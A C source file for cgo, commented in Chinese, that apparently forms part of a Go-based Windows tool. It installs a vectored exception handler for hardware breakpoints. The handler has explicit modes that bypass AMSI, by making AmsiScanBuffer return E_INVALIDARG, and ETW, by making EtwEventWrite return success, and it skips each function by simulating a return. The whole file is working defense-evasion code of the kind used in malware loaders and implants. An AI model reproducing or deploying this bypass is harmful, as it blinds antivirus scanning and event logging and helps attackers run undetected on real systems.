//go:build windows && amd64 && cgo

/*
 * hw_breakpoints.c — CGO 实现硬件断点 VEH 回调。
 *
 * 问题：Go 函数不能直接作为 Windows AddVectoredExceptionHandler 的回调。
 * 解决：用 C 函数做 VEH handler，通过函数指针表调用 Go 注册的 handler。
 *
 * Go 侧通过 set_bp_handler() 注册每个索引的回调函数指针。
 * C VEH handler 在 EXCEPTION_SINGLE_STEP 时遍历已启用的索引，
 * 调用对应的 Go handler。Handler 返回值非零时设置为新的 RIP，
 * 否则 RIP 前进 1 字节跳过被断点的指令。
 *
 * 特殊处理：AMSI/ETW 绕过
 * - AMSI: DR0 触发时设置 RAX = E_INVALIDARG (0x80070057)，然后跳过函数
 * - ETW:  DR1 触发时设置 RAX = STATUS_SUCCESS (0)，然后跳过函数
 * 通过在 set_bp_mode() 设置索引对应的行为模式来启用。
 */

#if defined(_WIN64) && defined(__GNUC__)

#include <windows.h>

#ifndef STATUS_CONTINUE_EXECUTION
#define STATUS_CONTINUE_EXECUTION ((LONG)0x10000001L)
#endif

/* 行为模式 */
#define MODE_SKIP       0  /* 默认：RIP++ 跳过指令 */
#define MODE_AMSI       1  /* AMSI bypass: RAX=0x80070057, skip function */
#define MODE_ETW        2  /* ETW bypass: RAX=0, skip function */

/* 断点 handler 函数指针数组（由 Go 调用 set_bp_handler 设置） */
static ULONG_PTR (*g_bp_handlers[4])(void) = {0};
static int g_bp_enabled[4] = {0};
static int g_bp_modes[4] = {0};

/* 设置断点 handler（由 Go 调用） */
void set_bp_handler(int index, ULONG_PTR (*handler)(void)) {
    if (index >= 0 && index < 4) {
        g_bp_handlers[index] = handler;
        g_bp_enabled[index] = (handler != NULL);
    }
}

/* 设置断点行为模式（由 Go 调用） */
void set_bp_mode(int index, int mode) {
    if (index >= 0 && index < 4) {
        g_bp_modes[index] = mode;
    }
}

/* VEH 异常处理器 — 处理 EXCEPTION_SINGLE_STEP */
LONG WINAPI hw_breakpoint_handler(EXCEPTION_POINTERS* excInfo) {
    if (excInfo->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP) {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    CONTEXT* ctx = excInfo->ContextRecord;
    DWORD64 dr6 = ctx->Dr6;

    /* DR6 bit 0-3 对应 DR0-DR3 哪个断点被触发 */
    for (int i = 0; i < 4; i++) {
        if (!(dr6 & (1ULL << i))) continue;
        if (!g_bp_enabled[i]) continue;

        switch (g_bp_modes[i]) {
        case MODE_AMSI: {
            /* AmsiScanBuffer 入口断点：修改 RAX 为 E_INVALIDARG，
             * 然后跳过整个函数（模拟 ret: RIP=[RSP], RSP+=8）。 */
            ctx->Rax = 0x80070057;
            ctx->Rip = *(ULONG_PTR*)ctx->Rsp;
            ctx->Rsp += 8; /* 真正的 ret 会弹出返回地址并递增 RSP */
            break;
        }
        case MODE_ETW: {
            /* EtwEventWrite 入口断点：修改 RAX 为 STATUS_SUCCESS，
             * 然后跳过整个函数（模拟 ret: RIP=[RSP], RSP+=8）。 */
            ctx->Rax = 0;
            ctx->Rip = *(ULONG_PTR*)ctx->Rsp;
            ctx->Rsp += 8; /* 栈帧修复：避免返回地址残留 */
            break;
        }
        default:
            /* MODE_SKIP 或自定义 handler */
            if (g_bp_handlers[i]) {
                ULONG_PTR newRip = g_bp_handlers[i]();
                if (newRip != 0) {
                    ctx->Rip = newRip;
                } else {
                    ctx->Rip += 1;
                }
            } else {
                ctx->Rip += 1;
            }
            break;
        }
    }

    /* 清除 DR6 的断点触发位 */
    ctx->Dr6 &= ~0xFULL;

    return STATUS_CONTINUE_EXECUTION;
}

/* 安装 VEH handler */
PVOID install_veh_handler(void) {
    return AddVectoredExceptionHandler(1, hw_breakpoint_handler);
}

/* 移除 VEH handler */
void remove_veh_handler(PVOID handle) {
    if (handle) {
        RemoveVectoredExceptionHandler(handle);
    }
}

#else

void set_bp_handler(int index, ULONG_PTR (*handler)(void)) { (void)index; (void)handler; }
void set_bp_mode(int index, int mode) { (void)index; (void)mode; }
PVOID install_veh_handler(void) { return NULL; }
void remove_veh_handler(PVOID handle) { (void)handle; }

#endif
